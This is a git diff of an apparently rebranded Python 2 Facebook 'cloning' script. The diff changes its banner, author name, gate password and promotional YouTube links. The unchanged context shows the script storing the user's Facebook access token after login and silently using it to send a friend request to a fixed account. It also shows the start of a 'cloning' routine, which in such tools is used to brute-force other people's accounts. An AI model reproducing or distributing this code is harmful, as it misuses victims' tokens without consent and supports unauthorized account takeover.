@@ -48,14 +48,12 @@ def jalan(z):
 
 ##### LOGO #####
 logo = """
-\033[1;92m           _________  _______   _______ 
-\033[1;92m           \__    _/ (  ___  ) (       )
-\033[1;92m              )  (   | (   ) | | () () |
-\033[1;92m              |  |   | (___) | | || || |
-\033[1;92m              |  |   |  ___  | | |(_)| |
-\033[1;92m              |  |   | (   ) | | |   | |
-\033[1;92m           |\_)  )   | )   ( | | )   ( |
-\033[1;92m           (____/    |/     \| |/     \|
+\033[1;91m░█████╗░██████╗░██████╗░░█████╗░██████╗░
+\033[1;36m██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔══██╗
+\033[1;91m███████║██████╔╝██████╦╝███████║██████╦╝
+\033[1;93m██╔══██║██╔══██╗██╔══██╗██╔══██║██╔══██╗
+\033[1;94m██║░░██║██║░░██║██████╦╝██║░░██║██████╦╝
+\033[1;95m╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝╚═════╝░
 """
 def tik():
 	titik = ['.   ','..  ','... ']
@@ -89,12 +87,12 @@ print  """
 
 print  """
 \033[1;92m♨️°───────(NOT A NAME ITS BRAND)───────°♨️
-\033[1;92m♨️°───────(JAM_KING_OF_FACEBOOK)───────°♨️
+\033[1;92m♨️°───────(ARBAB_KING_OF_FACEBOOK)───────°♨️
 
 """
 
-CorrectUsername = "jam"
-CorrectPassword = "jam"
+CorrectUsername = "Pakistan"
+CorrectPassword = "Arbab"
 
 
 loop = 'true'
@@ -107,10 +105,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "Wrong Password"
-            os.system('xdg-open https://www.Youtube.com/UCe6wmIybCxpRSB4o6pozMOA')
+            os.system('xdg-open https://m.youtube.com/channel/UC23obpgnG79fUSXS7QnEnTA')
     else:
         print "Wrong Username"
-        os.system('xdg-open https://www.Youtube.com/UCe6wmIybCxpRSB4o6pozMOA')
+        os.system('xdg-open https://m.youtube.com/channel/UC23obpgnG79fUSXS7QnEnTA')
 
 def login():
 	os.system('clear')
@@ -154,7 +152,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;36;40m[✓] Login Successful...'
-				os.system('xdg-open https://www.youtube.com/channel/UCe6wmIybCxpRSB4o6pozMOA')
+				os.system('xdg-open https://m.youtube.com/channel/UC23obpgnG79fUSXS7QnEnTA')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -221,7 +219,7 @@ def pilih():
 	elif unikers =="2":
 		os.system('clear')
 		print logo
-		print " \033[1;36;40m●════════════════════════◄JAM►════════════════════════●\n"
+		print " \033[1;36;40m●════════════════════════◄Arbab►════════════════════════●\n"
 		os.system('git pull origin master')
 		raw_input('\n\033[1;97m[ \033[1;97mBack \033[1;97m]')
 		menu()
@@ -314,7 +312,7 @@ def pilih_super():
 	print "\n\033[1;97m  ❈     \033[1;97mTo Stop Process Press CTRL+Z \033[1;97m    ❈"
 
 	jalan('       \033[1;97mJam start cloning Wait...')
-	print  " \033[1;36;48m●════════════════════◄JAM►════════════════════●" 
+	print  " \033[1;36;48m●════════════════════◄Arbab►════════════════════●" 
 
 	def main(arg):
 		global cekpoint,oks
